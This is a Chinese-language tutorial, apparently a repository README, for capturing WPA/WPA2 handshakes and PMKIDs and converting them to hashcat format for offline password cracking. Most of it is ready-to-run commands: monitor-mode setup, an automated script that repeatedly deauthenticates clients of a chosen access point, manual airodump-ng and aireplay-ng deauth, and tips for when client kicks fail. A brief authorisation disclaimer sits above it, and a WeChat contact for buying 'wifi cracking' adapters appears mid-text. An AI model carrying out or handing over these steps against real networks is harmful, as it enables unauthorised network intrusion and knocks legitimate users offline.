# 抓包教程：从 0 到有效握手（.cap / .hc22000）

本教程面向**已获授权**的无线安全测试。未经授权攻击他人网络违法。

---

## 1. 你要得到什么

离线破解需要的不是「连上 WiFi」，而是：

| 产物 | 说明 |
|------|------|
| `.cap` / `.pcap` | 802.11 空口捕获，内含 EAPOL 或可提 PMKID |
| `.hc22000` / `.22000` | hashcat mode 22000 文本哈希（推荐最终格式） |

有效证据至少满足其一：

- **EAPOL**：同轮次 M1+M2（更好：含 M3 的 authorized pair）  
- **PMKID**：部分路由器可在不踢客户端时提取

## 2. 硬件与系统

### 必需

- 支持 **Monitor Mode + Packet Injection** 的 **USB 无线网卡**  
- 安装 **Kali Linux**（实体机、或 Parallels/VMware/VirtualBox **USB 透传**）

### 推荐芯片方向（需结合驱动与虚拟机实测）

| 类型 | 说明 |
|------|------|
| MediaTek / Realtek 部分型号 | 常见于「监听网卡」商品；**务必确认注入** |
| Atheros 经典方案 | 资料多，部分旧卡驱动成熟 |
| 内置笔记本网卡 | 多数**不能** Monitor/注入，不要指望 |

不确定买什么：微信 `1837620622` 备注 `wifi破解（github）` 咨询网卡。

### 虚拟机注意

1. 关闭宿主机对该 USB 设备的占用  
2. 将网卡 **独占连接** 到虚拟机  
3. Kali 中 `lsusb` / `ip link` 能看到 `wlan0` 等接口

## 4. 流程 A：全自动（推荐）

```bash
# 1) 扫描周边，记下 BSSID 与信道
cd wifi-crack-kali/扫描抓包
sudo bash 1_scan.sh

# 2) 网卡进入 Monitor（名称以实际为准）
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# 若使用 airmon-ng：
# sudo airmon-ng check kill
# sudo airmon-ng start wlan0

# 3) 全自动：踢线 + 抓 EAPOL + 判定
cd ../自动攻击
sudo python3 auto_attack.py <BSSID> <频道> [SSID] [客户端MAC]
```

脚本采用 **爆发 Deauth → 静默监听** 循环，抓到有效 M1+M2 后停止并保存。

将生成的 `.cap` / `.hc22000` 拷到：

```text
shared/captures/          # 推荐（Mac/Windows 共用）
# 或
wifi-crack-notebook/captures/
```

## 5. 流程 B：经典三终端

```bash
# 终端1：扫描
sudo bash 1_scan.sh

# 终端2：锁定 BSSID/信道抓包
sudo bash 2_capture.sh
# 或: sudo airodump-ng -c <信道> --bssid <BSSID> -w hs wlan0mon

# 终端3：踢客户端迫使重连
sudo bash 3_deauth.sh
# 或 Scapy / aireplay-ng 定向 deauth
```

观察 airodump 右上角 **EAPOL** 握手标志或用 Wireshark 过滤 `eapol`。

## 6. 转为 hashcat 22000

在 Kali：

```bash
hcxpcapngtool -o out.hc22000 handshake.cap
# 检查
hashcat -m 22000 out.hc22000 --show
# 或查看文件是否含 WPA*01* / WPA*02*
head -c 200 out.hc22000; echo
```

Mac / Windows 上若已装 `hcxpcapngtool`，破解脚本也可用 `--cap` / `-Cap` 自动转换。

## 7. 有效性自检清单

- [ ] 文件非 0 字节，封装为 802.11  
- [ ] `hcxpcapngtool` 报告 **EAPOL pairs written ≥ 1** 或合法 PMKID  
- [ ] ESSID 正确（隐藏 SSID 需额外处理）  
- [ ] 不是「只有 Deauth、没有 M2」的空包

## 9. 常见失败

| 现象 | 处理 |
|------|------|
| 没有 wlan 接口 | USB 未透传 / 驱动未加载 |
| 无法 Monitor | 网卡不支持或驱动不对 |
| 踢不掉人 | 无注入；换网卡或提高距离/功率策略 |
| 一直无握手 | 目标无客户端；指定客户端 MAC；延长静默监听 |
| 转换 0 条 hash | 握手不完整；重抓 |

更细的原理见根目录 `README.md` 方法论章节。
